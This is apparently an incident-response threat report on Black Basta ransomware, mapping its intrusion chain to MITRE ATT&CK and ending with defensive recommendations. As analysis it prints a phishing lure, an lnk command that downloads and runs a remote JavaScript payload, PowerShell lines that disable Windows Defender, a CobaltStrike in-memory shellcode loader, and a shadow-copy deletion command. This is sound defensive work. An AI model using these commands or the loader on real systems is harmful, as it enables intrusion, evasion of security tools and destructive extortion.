Vulnerable\norganizations are advised to proactively apply appropriate countermeasures to reduce\ntheir risk exposure.\nAttack objectives include disabling anti-virus and endpoint detection and response\ntools, exfiltrating sensitive data and encrypting files with the “.basta” extension.\nInitial access is often acquired via malicious links in spearphishing emails. Common\n[tools used by Black Basta are Qakbot,](https://attack.mitre.org/software/S0650/) [SystemBC,](https://malpedia.caad.fkie.fraunhofer.de/details/win.systembc) [Mimikatz,](https://attack.mitre.org/software/S0002/) [CobaltStrike and](https://attack.mitre.org/software/S0154/) [Rclone.](https://attack.mitre.org/software/S1040/)\n\n### Summary\n\nIn recent months, news outlets have reported a surge in double extortion ransomware\nattacks by Black Basta, a notorious ransomware-as-a-service (RaaS) threat group first\nidentified in early 2022. The actor is sophisticated, often utilizing a unique set of tactics,\ntechniques and procedures (TTPs) to gain a foothold, spread laterally, exfiltrate data and\n\n\n-----\n\ndrop ransomware. However, Kroll has observed Black Basta sometimes utilizing similar\nTTPs across multiple incidents. Therefore, it's prudent for potential victims to educate\nthemselves and adopt proactive countermeasures to reduce their risk exposure.\n\nBlack Basta often gains initial access via a link to a malicious document delivered by email in\nthe form of a password-protected zip file. Once extracted, the document installs the Qakbot\nbanking trojan to establish backdoor access and deploy SystemBC, which establishes an\nencrypted connection to a C2 server. Often, Black Basta will acquire network persistence via\nlegitimate remote access software tools.\n\nNext, the post-exploitation framework known as CobaltStrike is installed for reconnaissance\nand deploying additional tooling across the network. Unlike most threat actors, Black Basta\nutilizes numerous tool deployment and remote access methods.\n\nBlack Basta often attempts to disable security tooling via premade scripts that interact with\nthe registry. Kroll has also observed attempts to remove or disable endpoint detection and\nresponse systems to conceal the deployment of tools such as Mimikatz and CobaltStrike.\n\nOne of Black Basta’s primary objectives is to exfiltrate data. Most often, this is achieved with\nRclone, which can filter for specific files before copying them to a cloud service. Once\nexfiltration is complete, the ransomware binary is executed to encrypt files with the “.basta”\nextension, delete volume shadow copies, and display a ransom note named readme.txt on\ninfected devices.\n\nBlack Basta loiter time is typically two to three days. However, an extended hibernation time\nsometimes occurs after the initial Qakbot infection. This may indicate that initial access is\nbeing sold to associated threat actors.\n\n## Tactics, Techniques and Procedures\n\n\n-----\n\n### Initial Exploit\n\nKroll has identified that the most common mode of initial access used by Black Basta is by\nsending a phishing email that contains a link to a zip file for the victim to download. The\nemail also often provides a password to the zip file to increase the perceived “authenticity” of\nthe email. The email addresses used by Black Basta vary between cases.\n```\nRe: Victim - Multiple POs attached\n\nGreetings!\n\nPlease check your docs as one doc available through the link lower:\n\nhxxps://sciencesformation[.]com/nsst/ditpciattusie\n\nFile password: U876\n\nWe have a price discrepancy on PO# A123456\n\nITEM: F799-CL - $168.46\n\n```\nFigure 1 - Anonymized Email Example\n\nThis initial access method is true across a number of cases worked by Kroll. It is common for\nthe zip file to have been accessed on several user endpoints. It is likely that the phishing\nemails are targeted and suggests some initial reconnaissance conducted by the threat\nactors. The link in Figure 1 drops a zip file within the user’s download folder. Once opened, a\nlink (.lnk) file masquerades as a document, for example, filename.Doc.lnk. This link file then\ndeploys Qakbot onto the endpoint.\n\n\n-----\n\nMITRE ATT&CK: T1566.002: Spearphishing Link\nMITRE ATT&CK: T1204.002: User Execution: Malicious File\n\n### Internal Scouting\n\nOne of the first tools deployed by Black Basta is CobaltStrike, which furnishes such postexploitation capabilities as network and port scanning. Further information on CobaltStrike is\ndetailed later in this report.\n\nMITRE ATT&CK: T1049: System Network Connections Discovery\n\n### Toolkit Deployment\n\nAfter the link file is executed, a curl command is executed to download a Javascript file, and\nthis is then executed by wscript.exe to compile the Qakbot binary. It also contacts the\ncommand-and-control servers to inform the threat actor that it is alive.\n```\n/q /c echo 'zA1' && MD \"%APPDATA%\\Iu\\MlSL\" && curl.exe --output\n%APPDATA%\\Iu\\MlSL\\FEqwhs8j.GE.v6E.js hxxps://partoniroo[.]com/N9/u.js && ping\nO0[.]org && cd \"%APPDATA%\\Iu\\MlSL\" && wscript FEqwhs8j.GE.v6E.js && ping H[.]io &&\nping u[.]org\n\n```\nFigure 2 – Lnk File Contents: Qakbot Initial Execution\n\nMITRE ATT&CK: T1204.002: User Execution: Malicious File\nMITRE ATT&CK: T1059.007: JavaScript\n\nTypically, a dll file is registered by RegSvr32 and a scheduled task is created. Qakbot is\nutilized to provide backdoor access and to deliver the next stage of tooling. Typically,\npersistence is achieved by the creation of autorun entries and scheduled tasks. This allows\nthreat actor to maintain a foothold within the network with backdoor access.\n\nMITRE ATT&CK: T1059.007: JavaScript\n\nBatch scripts are often deployed to inhibit detection by anti-virus or other security software.\nThe script names vary; however, the content appears to be similar and generally operates in\na similar way by removing Windows Defender in stages. Other scripts to remove specific\nanti-virus have also been identified including a script to establish a scheduled task to prevent\nanti-virus being reenabled.\n```\npowershell -ExecutionPolicy Bypass -command “New-ItemProperty -Path\n‘HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender’ -Name DisableAntiSpyware -Value\n1 -PropertyType DWORD -Force”\n\n```\nFigure 3 – Batch Script 1: Disable Windows Defender\n\n\n-----\n\n```\npowershell ExecutionPolicy Bypass command Set MpPreference\nDisableRealtimeMonitoring 1”\n\n```\nFigure 4 – Batch Script 2: Disable Windows Defender Monitoring\n```\npowershell -ExecutionPolicy Bypass Uninstall-WindowsFeature -Name Windows-Defender\n\n```\nFigure 5 – Batch Script 3: Remove Windows Defender\n\nKroll has also seen attempts to disable endpoint detection and response (EDR) tooling by\nutilizing the tool named Backstab. To achieve this, they use a legitimate copy of the process\nexplorer driver within C:\\Windows\\system32\\drivers\\ . This driver is used to kill process\nhandles of the EDR tools. The tool then checks the registry for names of common EDR tools\nand disables user access control (UAC) before attempting to remove those EDR tools.\n\nMITRE ATT&CK: T1562.001: Disable or Modify Tools\n\nMITRE ATT&CK: T1059: Command and Scripting Interpreter\n\nTo maintain control, Black Basta has been identified by Kroll as using multiple tools for\ncommand and control (C2). Common legitimate tools, including AnyDesk, AteraAgent and\nSplashtop, have been identified providing remote access.\n\nMITRE ATT&CK: T1219: Remote Access Software\n\nKroll has identified that the remote access tool known as SystemBC is indicative of Black\nBasta cases. The tool is preconfigured with C2 domains and can also be utilized as a Tor\nproxy to provide a channel for the threat actor to deploy scripts and other tools. Figure 6\ndetails the Black Basta configuration of SystemBC in one case. The name of the file is often\nobfuscated with a random name such as gemoh.exe. SystemBC also creates a scheduled\ntask to maintain persistence, usually named the same as the binary itself within\nC:\\Windows\\Tasks\\.\n```\n{\n\n \"HOST1\": \"restoreimagesinc[.]com\",\n\n \"HOST2\": \"restoreimagesinc[.]com\",\n\n \"PORT1\": \"443\",\n\n \"TOR\": \"\"\n\n}\n\n\n```\nFigure 6 – SystemBC config\n\nMITRE ATT&CK: T1090: Proxy\n\n### Escalation\n\n\n-----\n\nIn a number of Black Basta cases, the threat actor successfully phished a local administrator\naccount; however, Mimikatz is also used to access these credentials via a cache. This is run\non the domain controller once access is gained. Mimikatz is often renamed by Black Basta in\na likely attempt to evade security solutions even after disabling anti-virus solutions. Mimikatz\nis a common post-exploitation tool used to collect Windows credentials. It is also used for\ncollecting Kerberos tickets and is most commonly used to extract password hashes from\nLSA dumps and the security account managers database. The credentials are extracted and\nare then “cracked” to provide a credential pair. Mimikatz also provides the ability to conduct\n“pass the hash” by extracting the NTLM hash and allowing the hash to be forwarded to gain\naccess to other devices without the need to know the victim’s password.\n\nMITRE ATT&CK: T1003: OS Credential Dumping\n\nMITRE ATT&CK: T1558: Steal or Forge Kerberos Tickets\n\nBlack Basta attempts to increase privileges with open-source tools such as nircmd.exe and\nnsudo.exe, which can allow execution at higher levels of privilege. These are often delivered\nvia Qakbot or SystemBC.\n\nCobaltStrike provides capabilities to gain increased privileges such as SYSTEM-level\nexecution and “pass the hash” capabilities. Kroll has identified on several Black Basta cases\nthat server message block (SMB) remote service execution is leveraged by pushing files\nfrom the domain controller (see Lateral Movement for more details). Pass the hash attempts\nhave also been identified with Type 9 logins and corresponding commands passed via a\nnamed pipe.\n\nMITRE ATT&CK: T1558: Steal or Forge Kerberos Tickets\n\n### Lateral Movement\n\nBlack Basta has been found by Kroll to be using multiple tools for lateral movement.\nCommon legitimate tools such as AnyDesk, AteraAgent and Splashtop have been identified\nas not only providing remote access but also allowing the threat actor to move laterally within\nthe network. Remote desktop protocol (RDP) is regularly used with the previously collected\ncredentials.\n\nMITRE ATT&CK: T1219: Remote Access Software\n\nMITRE ATT&CK: T1021: Remote Services\n\nTypically, the post-exploitation framework known as CobaltStrike is installed as a service.\nThis provides crucial capabilities to the threat actor, including deploying tools and the\nransomware binary across the network. This is usually achieved by a SMB Beacon.\nCobaltStrike is installed via Qakbot, and this is normally identified via service creations with a\n\n\n-----\n\nseven (7) random alpha-numeric character name. A base64 encoded PowerShell command\nlaunched by the Command Specifier (%COMSPEC%) can be found within the service event\ndata, as shown in Figure 7.\n```\n%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand\nJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAL…\n<snip>\n\n```\nFigure 7 – CobaltStrike Service Execution\n\nStandard base64 decoding of the encoded string, shown in Figure 7, details that further\nGunzip compressed base64 encoded strings are present.\n```\n$s=New-Object IO.MemoryStream(,\n[Convert]::FromBase64String(\"H4sIAAAAAAAA/61WbXPauhL+HH6FPmTG9hQogTQNvZOZ8o45QAgmlJbD\nMEKWwWAskGSDc9r/flY25tDb5N7O3JsZJrK0u9p99tldWVTmLMldInvMpig3ply4zEfFTOa6zkyJHtBnLeMEP\npFqWy3mSyrnO87IHNs2p0KgvzJ… <snip> \"));IEX (New-Object IO.StreamReader(New-Object\nIO.Compression.GzipStream($s,\n[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n\n```\nFigure 8 – CobaltStrike Encoded Command\n\nA further base64 encoded blob can be extracted and decrypted with an XOR key of 35, as\nshown in Figures 9 and 10.\n\n\n-----\n\n```\nSet StrictMode Version 2\n\n$DoIt = @'\n\nfunction func_get_proc_address {\n\n     Param ($var_module, $var_procedure)\n     $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() |\nWhere-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')\n[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\n     $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]]\n@('System.Runtime.InteropServices.HandleRef', 'string'))\n\n     return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef]\n(New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr),\n($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null,\n@($var_module)))), $var_procedure))\n\n}\n\nfunction func_get_delegate_type {\n\n     Param (\n\n          [Parameter(Position = 0, Mandatory = $True)] [Type[]]\n$var_parameters,\n\n          [Parameter(Position = 1)] [Type] $var_return_type = [Void]\n\n     )\n\n     $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((NewObject System.Reflection.AssemblyName('ReflectedDelegate')),\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryMod\nule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,\nAutoClass', [System.MulticastDelegate])\n\n     $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public',\n[System.Reflection.CallingConventions]::Standard,\n$var_parameters).SetImplementationFlags('Runtime, Managed')\n\n     $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot,\nVirtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime,\nManaged')\n\n     return $var_type_builder.CreateType()\n\n}\n\n[Byte[]]$var_code =\n[System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfI\nQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF\n4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+EuNJY0sjMyMjS9zcJCNJI0t7h3D\nG3PZzyosjIyN5EupycksjkycjSyOTJyNJIkklSSBxS2ZT/Pfc9nOoNwdJI3FLC0xewdz2puNXTUkjSSNJI6rF\noOUnqsGg4SuoXwcvSSN1SSdxdEuOvXyY3PaodwczSSN1SyMDIyNxdEuOvXyY3Pam41c3qG8HJ6gnByLrqicHq\nHcHMyLhyPSoXwcvdEvj2f7f3PZ0S+W1pHHc9qgnB6hvBysa4lckS9OWgXXc9txHBzPLcNzc3H9/DX9TSlNGf3\nRKTVBMQEgRf2BCV0JPTERgS0JNREZvSlBXRk1GUQ5qe2hwRhsVDhIjBPhVVw==')\n\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n\n     $var_code[$x] = $var_code[$x] -bxor 35\n\n}\n\n$var_va =\n\n```\n\n-----\n\n```\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_pro\nc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32],\n[UInt32], [UInt32]) ([IntPtr])))\n\n$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer,\n$var_code.length)\n\n$var_runme =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer,\n(func_get_delegate_type @([IntPtr]) ([Void])))\n\n$var_runme.Invoke([IntPtr]::Zero)\n\n'@\n\nIf ([IntPtr]::size -eq 8) {\n\n     start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | ReceiveJob\n\n}\n\nelse {\n\n     IEX $DoIt\n\n}\n\n```\nFigure 9 – CobaltStrike Decoded Loader\n\nThe named pipe identified in Figure 9 shows the presence of SMB beacons.

Typically, an administrator share, for\nexample “$ADMIN”, is used to store the malicious binary to then be executed from a domain\ncontroller. Detection of this activity can be identified within PowerShell logging.\n\nMITRE ATT&CK: T1543.003: Create or Modify System Process: Windows Service\n\nMITRE ATT&CK: T1509: Command and Scripting Interpreter\n\nMITRE ATT&CK: T1572: Protocol Tunneling\n\nMITRE ATT&CK: T1021.002: Remote Services: SMB/Windows Admin Shares\n\nMITRE ATT&CK: T1071: Application Layer Protocol\n\n\n-----\n\n### Mission Execution\n\nOnce Black Basta has established themselves on the network, they look to identify files for\nexfiltration. Kroll has identified that Rclone is Black Basta’s tool of choice for exfiltration,\nalthough WinSCP has also been identified. Rclone provides the ability to upload data to a\nconfigured cloud storage provider. Detection of this can be achieved by investigating the\nsystem pagefile, system resource usage monitor (SRUM) and the UsnJrnl ($J).\n\nMITRE ATT&CK: T1567.002: Exfiltration Over Web Service: Exfiltration to Cloud Storage\n\nAfter data exfiltration, the next stage is to encrypt endpoints with the Black Basta\nransomware binary. The executable name varies between incidents; however, it often\nprovides the same capabilities. The binary launches a command line to delete VSS shadow\ncopies with vssadmin, as shown in Figure 11, before encrypting files and creating the\nreadme.txt file.\n```\nC:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet\n\n```\nFigure 11 – Shadow Copy Deletion by Black Basta Ransomware\n\nDeleting the volume of shadow copies helps prevent system recovery, providing further\nleverage for the threat actor to demand a ransom for decryption.\n\nMITRE ATT&CK: T1490: Inhibit System Recovery\n```\nYour data are stolen and encrypted\n\nThe data will be published on TOR website if you do not pay the ransom\n\nYou can contact us and decrypt one file for free on this TOR site\n\n(you should download and install TOR browser first https://torproject.org)\n\n<redacted tor link>\n\nYour company id for log in: <redacted>\n\n```\nFigure 12 – Example readme.txt Black Basta Ransom Note\n\nFigure 12 details the standard Black Basta ransom note, which states that data has been\nexfiltrated. As mentioned earlier, while exfiltration is common, the encrypted file extensions\nmay vary. Typically, files are appended with “.basta” but variations of this extensions have\nbeen identified. The ransomware binary also changes the wallpaper to the image shown in\nFigure 13. The binary places a .jpg file within the user’s local temp directory, which is then\nused to create the wallpaper image.\n\n\n-----\n\nFigure 13 – Desktop Wallpaper Configuration\n\nOnce encryption is complete the threat actor will likely leave the network. If the victim does\nnot interact with the threat actor, company information and a data listing will be added to the\nBlack Basta leak site. A screenshot of the leak site can be found in Figure 14.\n\n\n-----\n\nFigure 14 – Black Basta Leak Site\n\nMITRE ATT&CK: T1486: Data Encrypted for Impact\n\n## Mitre ATT&CK Mapping\n\n**Tactic** **Technique** **Procedure**\n\nTA0001 T1566.002 Spearphishing Link\n\nTA0002 T1059 Command and Scripting Interpreter\n\nT1053 Scheduled Task/Job\n\n\n-----\n\nT1204.002 User Execution: Malicious File\n\nTA0003 T1053 Scheduled Task/Job\n\nT1543.003 Create or Modify System Process:\nWindows Service\n\nTA0004 T1078 Valid Accounts\n\nTA0005 T1562 Impair Defences: Disable or Modify\nTools\n\nTA0006 T1003 OS Credential Access\n\nT1558 Steal or Forge Kerberos Tickets\n\nTA0007 T1049 System Network Connections\nDiscovery\n\nTA0008 T1021 Remote Services\n\nTA0009 T1005 Data from Local System\n\nTA0011 T1219 Remote Access Software\n\nT1090 Proxy\n\nT1071 Application Layer Protocol\n\nT1572 Protocol Tunneling\n\nTA0010 T1567.002 Exfiltration Over Web Service:\nExfiltration to Cloud Storage\n\nTA0040 T1490 Inhibit System Recovery\n\nT1486 Data Encrypted for Impact\n\n\n-----\n\n## Recommendations\n\nKroll has identified recommendations relating to this alert:\n\n**Recommendation** **Observation**\n\n\nUtilize anti-spoofing and email\nauthentication mechanisms\n\n\nBlack Basta relies on spearphishing for initial access.\nPrevention of such emails may limit the success of\nspearphishing attempts.\n\n\nDisable Plaintext Passwords Limiting cached cleartext credentials can limit the\nsuccess of Mimikatz.\n\n\nMonitor PowerShell Execution\n\nEnsure PowerShell is logged and\ncreate detections for encoded\nscript execution\n\nAudit user, administrator and\nservice accounts\n\nEnsure accounts have the correct\naccess and privileges.
